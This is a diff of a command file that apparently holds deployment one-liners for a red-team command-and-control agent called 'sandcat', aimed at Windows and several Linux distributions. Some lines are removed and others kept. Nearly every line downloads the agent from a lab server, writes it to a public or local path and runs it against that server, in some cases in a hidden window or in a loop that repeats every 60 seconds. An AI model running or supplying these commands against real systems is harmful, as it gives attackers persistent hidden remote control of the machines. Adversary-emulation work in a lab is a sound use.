@@ -1,13 +1,4 @@
-$url="http://192.168.56.1:8888/file/download"; $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output); C:\Users\Public\sandcat.exe -server http://192.168.56.1:8888 -group my_group;
-
-
-
-
-
-while($true) {$url="http://192.168.56.1:443/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("file","sandcat.exe");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe http://192.168.56.1:443 my_group; sleep 60}
-
-
-$server="http://192.168.56.1:8888";
+$server="http://0.0.0.0:8888";
 $url="$server/file/download";
 $wc=New-Object System.Net.WebClient;
 $wc.Headers.add("platform","windows");
@@ -18,23 +9,3 @@ get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-p
 rm -force "C:\Users\Public\$name.exe" -ea ignore;
 [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
 Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
-
-
-server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > centOS;chmod +x centOS;./centOS -server $server -group red -v
-
-server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > debian;chmod +x debian;./debian -server $server -group red -v
-
-
-server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > ubuntu;chmod +x ubuntu;./ubuntu -server $server -group red -v
-
-
-server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > lubuntu;chmod +x lubuntu;./lubuntu -server $server -group red -v
-
-
-server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > kali;chmod +x kali;./kali -server $server -group red -v
-
-
-server="http://192.168.56.1:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > fedora;chmod +x fedora;./fedora -server $server -group red -v
-
-
-
